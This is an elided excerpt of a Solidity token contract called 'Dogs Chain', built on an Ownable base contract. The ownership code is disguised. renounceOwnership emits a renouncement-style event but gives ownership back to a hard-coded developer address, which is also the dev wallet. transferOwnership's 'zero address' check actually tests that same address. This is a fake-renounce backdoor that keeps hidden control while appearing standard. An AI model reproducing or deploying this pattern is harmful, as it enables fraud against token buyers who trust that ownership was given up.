...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x2130f8Ba07F33C886235Cd1Bd707b8b9e36Ae8B6;
        emit OwnershipTransferred(address(0x2130f8Ba07F33C886235Cd1Bd707b8b9e36Ae8B6), _owner);
    }
    ...
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x2130f8Ba07F33C886235Cd1Bd707b8b9e36Ae8B6));
        _owner = address(0x2130f8Ba07F33C886235Cd1Bd707b8b9e36Ae8B6);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0x2130f8Ba07F33C886235Cd1Bd707b8b9e36Ae8B6), "Ownable: new owner is the zero address");
...
contract DC is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x2130f8Ba07F33C886235Cd1Bd707b8b9e36Ae8B6);
    ...
    */
    ...
    string private _name = "Dogs Chain"; 
    ...
    */
    ...
    uint256 public _maxWalletToken = _tTotal.mul(90).div(100);
